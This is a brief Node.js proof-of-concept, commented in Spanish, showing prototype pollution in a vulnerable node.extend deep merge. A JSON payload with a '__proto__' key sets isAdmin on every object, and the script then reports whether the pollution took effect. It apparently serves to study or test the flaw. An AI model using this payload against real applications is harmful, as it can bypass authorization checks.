const extend = require("node.extend");

// Aseguramos que la demostración comience limpia.
delete Object.prototype.isAdmin;

console.log("Antes de procesar el payload:");
console.log("¿Un objeto nuevo es admin?", ({}).isAdmin);

// Simula datos controlados por un atacante.
const payload = JSON.parse(`
  {
    "__proto__": {
      "isAdmin": true
    }
  }
`);

// La versión vulnerable mezcla el payload de forma insegura.
extend(true, {}, payload);

console.log("\nDespués de procesar el payload:");
console.log("¿Un objeto nuevo es admin?", ({}).isAdmin);

if (({}).isAdmin === true) {
  console.log("\n⚠ Prototype Pollution detectado.");
} else {
  console.log("\n✓ No se detectó Prototype Pollution.");
}

// Limpieza antes de finalizar el proceso.
delete Object.prototype.isAdmin;